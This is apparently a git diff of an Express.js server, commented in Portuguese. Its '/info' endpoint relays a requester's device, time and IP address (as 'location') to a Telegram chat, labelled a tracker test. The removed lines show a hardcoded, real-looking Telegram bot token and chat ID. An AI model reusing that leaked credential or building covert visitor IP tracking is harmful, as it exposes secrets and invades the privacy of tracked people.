@@ -1,4 +1,7 @@
 import express from 'express'
+import dotenv from 'dotenv';
+dotenv.config();
+
 const app = express()
 const port = 3000
 
@@ -13,12 +16,13 @@ app.get('/', (req, res) => {
 app.post('/info', (req, res) => {
     //Recebimento dos dados
 
-    const { device, location, time } = req.body
+    const { device, time } = req.body
+    const location = req.headers["x-forwarded-for"] 
 
     try {
         //Validação mor
         
-        if (!device || !location || !time) {
+        if (!device || !time) {
             res.status(400).json({
                 status: "Erro",
                 message: "Erro ao receber dados."
@@ -27,13 +31,13 @@ app.post('/info', (req, res) => {
 
         //Main
 
-        fetch("https://api.telegram.org/bot8291442432:AAEC8mg0l4Rn7jRjIqJSKbJ4jck9vdV8ofE/sendMessage", {
+        fetch(`https://api.telegram.org/bot${process.env.API_KEY}/sendMessage`, {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
-                chat_id: "8535287121",
+                chat_id: `${process.env.CHAT_KEY}`,
                 text: `🚀 Teste do Tracker \n\n 💻 Dispositivo: ${device} \n 📍 Localização: ${location} \n ⌚ Hora: ${time}` 
             })
         })
